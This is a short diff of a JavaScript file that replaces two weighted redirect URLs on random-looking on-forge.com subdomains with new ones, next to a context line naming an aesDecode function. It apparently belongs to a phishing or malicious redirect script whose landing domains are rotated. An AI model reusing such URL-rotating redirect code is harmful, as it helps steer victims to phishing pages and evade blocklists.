@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://4-dsfhdfdfhd.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 },
-        { url: "https://4-dsfhdfdfhd.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 }
+        { url: "https://5-jsdhvsdjfds.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 },
+        { url: "https://5-jsdhvsdjfds.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 }
       
     ];
 
